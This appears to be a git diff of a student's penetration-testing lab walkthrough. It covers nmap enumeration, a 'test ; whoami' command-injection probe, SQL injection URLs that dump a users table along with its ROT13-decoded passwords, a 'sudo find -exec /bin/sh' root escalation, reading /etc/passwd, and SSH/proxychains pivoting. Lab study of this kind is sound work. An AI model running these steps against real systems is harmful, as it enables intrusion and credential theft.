@@ -218,7 +218,7 @@ LPORT is RHP used in MSFCONSOLE
 
 # Dry Run Review
 
-## 1 Host Enumeration (TGT1)
+## (1) Host Enumeration (TGT1)
 First NMAP the given IP Address to get information about the ports open
 ```
 student@lin-ops:~$ nmap -Pn -T4 10.50.36.82
@@ -236,7 +236,7 @@ Nmap done: 1 IP address (1 host up) scanned in 3.93 seconds
 
 
 
-## 2 Port Enumeration (TGT1)
+## (2) Port Enumeration (TGT1)
 Perform a http-enum script to see what the port 80 has
 ```
 student@lin-ops:~$ nmap --script http-enum 10.50.36.82
@@ -257,14 +257,14 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds
 ```
 
-## 3 Website Enumeration (TGT1)
+## (3) Website Enumeration (TGT1)
 Firefox to the IP Address hosting port 80 and enumerate
 http://10.50.36.82
 
 Open all the tabs to see what each site can be used for information
 
 
-## 4 Authentication Bypass Login.html (TGT1)
+## (4) Authentication Bypass Login.html (TGT1)
 ```
 login.html
 
@@ -277,7 +277,7 @@ If we get information we Inspect and go to Network --> Post --> Copy to URL/?<pa
 http://10.50.36.82/login.php/?<PASTE NETWORK POST RAW INFORMATION>
 ```
 
-## 5 Search File to Read (TGT1)
+## (5) Search File to Read (TGT1)
 ```
 test ; whoami to see if it would get information
 
@@ -296,7 +296,7 @@ for information about hosts for next pivot
 
 ```
 
-## 6 Malicious Upload (TGT1)
+## (6) Malicious Upload (TGT1)
 ```
 Need to know:
 Way to Upload
@@ -311,14 +311,14 @@ How to:
 
 ```
 
-## 7 /scripts (TGT1)
+## (7) /scripts (TGT1)
 ```
 http-enum provided sub directories and within /scripts we located information about a user
 
 ```
 
 
-## 8 Authenticate TGT1 and Enum next PIVOT (TGT1)
+## (8) Authenticate TGT1 and Enum next PIVOT (TGT1)
 ```
 ssh user2@10.50.36.28
 
@@ -343,20 +343,104 @@ ssh -S /tmp/T1 T1 -O forward -D 9050 (Dynamic SOCKET)
 ```
 
 
-## 9 Tunnel to TGT2 80 (TGT2)
+## (9) Tunnel and ENUM TGT2 80 - SQL INJECTION (TGT2)
 ```
 ssh -S /tmp/T1 T1 -O forward -L 1234:192.168.28.181:80
 firefox
 http://127.0.0.1:1234
 
 
+Perform DATABASE enumeration
+
+http://127.0.0.1:1234/pick.php?product=7 OR 1 = '1'
+http://127.0.0.1:1234/pick.php?product=7 UNION SELECT 1,2,3(4,5,6,7) (Can see ORDER from here) (The current order is 1,3,2)
+http://127.0.0.1:1234/pick.php?product=7 UNION 
+
+GOLDEN STATEMENT
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+
+Since the order is 1,3,2 we can reorder it to show properly
+
+http://127.0.0.1:1234/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+
+--> Scroll to bottom and see USER Configured Databases
+--> Dump all the Column for each information
+
+http://127.0.0.1:1234/pick.php?product=7 UNION SELECT username,name,user_id FROM siteusers.users
+
+
+HAM 	                    32  $15
+Aaron 	                  1 	 $Aaron
+user2 	                  2 	 $user2
+user3 	                  3 	 $user3
+Lroth 	                  4 	 $Lee_Roth
+ncnffjbeqlCn$$jbeq 	     1 	 $Aaron
+RntyrfVfNER78 	          2 	 $user2
+Obo4GURRnccyrf 	         3 	 $user3
+anotherpassword4THEages 	4 	 $Lroth
+
+--> Be sure to mess with filter to get all the DATA
+--> ROT 13 the passwords that were found
+-->
+
+
+apasswordyPa$$word 	   
+EaglesIsARE78 	         
+Bob4THEEapples 	        
+nabgurecnffjbeq4GURntrf
 ```
 
 
+## (10) SUDO -L (TGT3)
+```
+Using the creds on the next box we are able to access 192.168.28.172 using Credentials found in 9
 
+SUDO -L
 
+linops:> ssh Aaron@192.168.28.172
+Aaron@RoundSensor:/> sudo -l (Finds what you can sudo)
 
+(ALL) NOPASSWD: /usr/bin/find
+GTFO bins and find
+> sudo find . -exec /bin/sh \; -quit
+# {root shell accepted}
 
+With finding the SUDO -L information we can go to GTFO BINS and find a SUDO
 
+Now we have Root Access due to the SUDO priv escalation found on GTFO
 
 ```
+
+## (11) Now that we have ROOT on .172 (TGT3)
+```
+Enumerate information
+
+cat /etc/passwd
+cat /etc/hosts
+ip a
+ip n
+After we perform the ip n we can find more boxes to enumerate past the TGT3
+
+Perform a Ping to see what IP Addresses can be reached (TTL can give information about Operating System)
+We now found the TGT 4
+```
+
+## (12) Enum TGT 4 (TGT3)
+```
+close and reopen -D 9050 on the TGT2 ssh -s socket
+
+ssh -S /tmp/T2 t2 -O forward -D 9050
+
+proxychains nmap -Pn -T4 192.168.28.179
+22 SSh 
+135 msrpc
+139 netbios-ssn
+445 microsoft-ds
+3389 ms-wbt-server
+9999 abyss
+
+We can try to exploit either 3389 or 9999
+
+```
+
+## (13)
